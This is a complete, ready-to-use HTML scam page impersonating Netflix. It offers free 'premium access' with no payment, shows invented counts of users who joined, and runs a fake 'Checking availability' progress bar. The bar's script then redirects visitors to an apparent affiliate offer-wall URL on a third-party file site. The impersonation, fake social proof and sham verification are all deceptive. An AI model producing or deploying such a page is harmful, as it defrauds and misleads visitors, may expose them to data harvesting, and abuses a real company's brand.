<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Netflix Premium Access</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: black;
  color: white;
}

.header {
  padding: 15px;
  text-align: left;
}

.logo {
  width: 100px;
}

.container {
  text-align: center;
  padding: 30px 20px;
}

h1 {
  font-size: 24px;
  margin-bottom: 10px;
}

.sub {
  color: #ccc;
  margin-bottom: 20px;
}

.box {
  background: #111;
  padding: 20px;
  border-radius: 10px;
  max-width: 350px;
  margin: auto;
}

.btn {
  background: #e50914;
  color: white;
  border: none;
  padding: 15px;
  width: 100%;
  font-size: 18px;
  border-radius: 5px;
  cursor: pointer;
  margin-top: 15px;
}

.btn:hover {
  background: #b20710;
}

.loader {
  display: none;
  margin-top: 20px;
}

.progress {
  width: 100%;
  background: #333;
  border-radius: 10px;
  overflow: hidden;
}

.progress-bar {
  height: 8px;
  width: 0%;
  background: #e50914;
}

.small {
  font-size: 12px;
  color: #aaa;
  margin-top: 10px;
}
</style>
</head>

<body>

<div class="header">
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
</div>

<div class="container">
  
  <h1>Unlimited Movies, TV Shows, and More.</h1>
  <p class="sub">Watch anywhere. Cancel anytime.</p>

  <div class="box">
    <p>🎉 Premium access unlocked</p>
    <p>🔥 5,200+ users joined today</p>
    <p>✅ No payment required</p>

    <button class="btn" onclick="startProcess()">Get Started</button>

    <div class="loader" id="loader">
      <p>Checking availability...</p>
      <div class="progress">
        <div class="progress-bar" id="bar"></div>
      </div>
    </div>

    <p class="small">Quick verification may be required</p>
  </div>

</div>

<script>
function startProcess() {
  document.getElementById("loader").style.display = "block";
  let bar = document.getElementById("bar");
  let width = 0;

  let interval = setInterval(function() {
    width += 10;
    bar.style.width = width + "%";

    if (width >= 100) {
      clearInterval(interval);
      window.location.href = "https://singingfiles.com/show.php?l=0&u=719378&id=74375";
    }
  }, 300);
}
</script>

</body>
</html>
